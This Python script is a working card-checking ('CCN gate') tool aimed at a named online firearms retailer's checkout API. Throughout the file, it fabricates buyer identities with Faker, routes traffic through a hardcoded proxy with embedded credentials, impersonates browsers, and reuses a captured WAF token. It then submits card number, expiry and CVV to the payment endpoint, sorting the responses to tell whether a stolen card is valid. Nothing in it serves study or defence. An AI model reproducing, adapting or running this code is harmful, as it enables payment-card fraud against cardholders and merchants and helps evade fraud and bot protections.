import random, time
from faker import Faker
from random import choice

from curl_cffi import requests
from fake_useragent import UserAgent


def usuario() -> dict:
    number = random.randint(1111, 9999)
    postal = random.choice(['10080', '14925', '71601', '86556', '19980'])
    return { 'name' : Faker().name(), 'email' : Faker().email().replace('@', '{}@'.format(number)), 'username' : Faker().user_name(), 'phone' : '512678{}'.format(number), 'city' : Faker().city(), 'code' : postal }


def capture(data, start, end):
    try:
        star = data.index(start) + len(start)
        last = data.index(end, star)
        return data[star:last]

    except ValueError:
        return None

def ccn_gate(card):
    max_retries = 15
    retry_count = 0
    while retry_count < max_retries:
        try:
            #============[Funcions Need]============#
            cliente = requests.Session(impersonate=choice(["chrome124", "chrome123", "safari17_0", "safari17_2_ios", "safari15_3"]))
            cliente.proxies = {'https': 'http://ubcff417d571a05cf-zone-custom-region-us-st-newyork-city-yonkers-session-OKEZNXIYE-sessTime-5:ubcff417d571a05cf@170.106.118.114:2334'}#the proxies?http://ubcff417d571a05cf-zone-custom-region-us-st-newyork-city-yonkers-session-OKEZNXIYE-sessTime-5:ubcff417d571a05cf@170.106.118.114:2334
            cc_number, mes, ano_number, cvv = card.split('|')
            if len(ano_number) == 2: ano_number = "20"+ano_number
            agente_user = UserAgent()

            #============[Address Found]============#
            name  = usuario()['name'].split(' ')[0]
            last  = usuario()['name'].split(' ')[1]
            email = usuario()['email']
            number = random.randint(1111, 9999)
            street = f"{name} street {number}"
            phone = usuario()['phone']

            #============[Requests 1]============#
            headers = { "User-Agent": agente_user.random, "Accept": "*/*", "Referer": "https://indianafirearms.com/product/hornady-moose-head-dog-toy", "Content-Type": "text/plain;charset=UTF-8", "Origin": "https://indianafirearms.com" }
            data    = {"product_id":1392728,"quantity":1,"fd_token":None,"shopping_cart_id":"","source":"FRONTEND","hostname":"indianafirearms.com","app_route":"/product/hornady-moose-head-dog-toy","bid":"d420a6873d96dc770dad6cc7f4154443828fef5b4396033b154f373f30955c6a"}
            result  = cliente.post(url="https://indianafirearms.com/api/api.php?action=add_to_cart", json=data, headers=headers)
            cart_id = capture(result.text, '"shopping_cart_id":', ',')

            #============[Requests 2]============#
            headers = { "User-Agent": agente_user.random, "Accept": "*/*", "Referer": "https://indianafirearms.com/checkout/delivery", "Content-Type": "text/plain;charset=UTF-8", "Origin": "https://indianafirearms.com" }
            data    = {"display_name":"","waiver_on_file":False,"drivers_license_state":"NY","first_name":name,"last_name":last,"phone_number":phone,"email_address":email,"notes":"","source":"CHECKOUT","fd_token":None,"shopping_cart_id":cart_id,"section":"delivery","hostname":"indianafirearms.com"}
            result  = cliente.post(url="https://indianafirearms.com/api/api.php?action=save_item_contact", json=data, headers=headers)
            cont_id = capture(result.text, '"contact_id":', ',')

            #============[Requests 3]============#
            headers = { "User-Agent": agente_user.random, "Accept": "*/*", "Referer": "https://indianafirearms.com/checkout/delivery", "Content-Type": "text/plain;charset=UTF-8", "Origin": "https://indianafirearms.com" }
            data    = {"display_name":"","waiver_on_file":False,"drivers_license_state":"NY","first_name":name,"last_name":last,"phone_number":phone,"email_address":email,"notes":"","source":"CHECKOUT","fd_token":None,"shopping_cart_id":cart_id,"section":"delivery","hostname":"indianafirearms.com","contact_id":cont_id}
            result  = cliente.post(url="https://indianafirearms.com/api/api.php?action=save_billing", json=data, headers=headers)

            #============[Requests 4]============#
            headers = { "User-Agent": agente_user.random, "Accept": "*/*", "Referer": "https://indianafirearms.com/checkout/delivery", "Content-Type": "text/plain;charset=UTF-8", "Origin": "https://indianafirearms.com/" }
            data    = {"source":"CHECKOUT","contact_id":cont_id,"pickup":1,"country_code":"","notes":"","address_type_code":"SHIPPING","fd_token":None,"shopping_cart_id":cart_id,"section":"delivery","hostname":"indianafirearms.com"}
            result  = cliente.post(url="https://indianafirearms.com/api/api.php?action=save_shipping", json=data, headers=headers)
            
            #============[Requests 5]============#
            headers = { "User-Agent": agente_user.random, "Accept": "*/*", "Referer": "https://indianafirearms.com/checkout/payment", "Content-Type": "text/plain;charset=UTF-8", "Origin": "https://indianafirearms.com" }
            data    = {"contact_id":cont_id,"client_id":143,"first_name":name,"middle_name":"","last_name":last,"suffix":"","company_name":"","address_1":street,"address_2":"","city":"New York","state":"NY","zip_code":"10080","country_code":"US","latitude":"","longitude":"","email_address":email,"phone_number":f"(312) 647-{number}","phone_number_type_id":1,"birthdate":"","source_id":"","notes":"","last_update":"2025-02-26 19:23:57","inactive":0,"version":1,"membership_id":"","membership_number":"","end_date":"","membership_inactive":"","subscription_id":"","payment_on_file":0,"drivers_license_number":"","display_name":f"{name}  {last}","waiver_on_file":False,"fd_token":None,"shopping_cart_id":cart_id,"section":"payment","source":"CHECKOUT","hostname":"indianafirearms.com"}
            result  = cliente.post(url="https://indianafirearms.com/api/api.php?action=save_item_contact", json=data, headers=headers)
            
            #============[Requests 6]============#
            headers = { "User-Agent": agente_user.random, "Accept": "*/*", "Referer": "https://indianafirearms.com/checkout/payment", "Content-Type": "text/plain;charset=UTF-8", "Origin": "https://indianafirearms.com" }
            data    = {"contact_id":cont_id,"client_id":143,"first_name":name,"middle_name":"","last_name":last,"suffix":"","company_name":"","address_1":street,"address_2":"","city":"New York","state":"NY","zip_code":"10080","country_code":"US","latitude":"","longitude":"","email_address":email,"phone_number":f"(312) 647-{number}","phone_number_type_id":1,"birthdate":"","source_id":"","notes":"","last_update":"2025-02-26 19:23:57","inactive":0,"version":1,"membership_id":"","membership_number":"","end_date":"","membership_inactive":"","subscription_id":"","payment_on_file":0,"drivers_license_number":"","display_name":f"{name}  {last}","waiver_on_file":False,"fd_token":None,"shopping_cart_id":cart_id,"section":"payment","source":"CHECKOUT","hostname":"indianafirearms.com"}
            result  = cliente.post(url="https://indianafirearms.com/api/api.php?action=save_billing", json=data, headers=headers)
   
            #============[Requests 7]============#
            headers = { "User-Agent": agente_user.random, "Accept": "*/*", "Referer": "https://indianafirearms.com/checkout/review", "Content-Type": "text/plain;charset=UTF-8", "Origin": "https://indianafirearms.com/", "Cookie": "aws-waf-token=08635d00-405d-4872-97af-23f64c087bb1:EQoAopwO+Ht6AQAA:j9Xkw192V0wP1tXeSyK2zs9HMQNf2aNBqlSiQdcgm4UKnTT1vpik5YtsYXu/onn+50CkTYiYhqqA3tCEeUOutOeRvXcDqkus2mT2ggXbCXeFuvohMKwuJyQYkB2ryxKTOl+h6S8pHwYxvRXNrbgKbqJLx/eQx7TWEJWespcVwV049HoKdULDlzTa4J1XV8y+TZzqw0MAu1cSlam3YN5ezWkxvnWv0F7NKKgD3Z9sq7ElZcaUt5AyfwFpi4wyKA==; checkout_id=dUKdWj" }
            data    = {"number":cc_number,"cardholder_name":f"{name} {last}","month":mes,"year":ano_number,"cvv":cvv,"simulate":"","checkout_id":"Bkubfe","fd_token":None,"shopping_cart_id":cart_id,"section":"review","source":"CHECKOUT","hostname":"indianafirearms.com"}
            result  = cliente.post(url="https://indianafirearms.com/api/api.php?action=process_credit_card", json=data, headers=headers)

            if "ip_country rule triggered" in result.text:
                cliente.close()
                retry_count += 1
            
            elif "Error 000, Please contact customer service" in result.text:
                cliente.close()
                retry_count += 1
            
            elif "CVV2 MISMATCH" in result.text:
                cliente.close()
                return card, result.json()['message']
            else:
                try:
                    #save_html = open('page1.html', 'w+', encoding="utf-8")
                    #save_html.write(result.text)
                    cliente.close()
                    return card, result.json()['message']
                except:
                    save_html = open('index.html', 'w+', encoding="utf-8")
                    save_html.write(result.text)
                    cliente.close()
                    return card, "REVISAR HTML CREADO!"

        
            
        except Exception as e:
            print(e)
            retry_count += 1
    else:
        return {"card": card, "status": "ERROR", "resp":  f"Retries: {retry_count}"}
    

if __name__ == "__main__":
    print(ccn_gate("4355460266914570|11|2026|661"))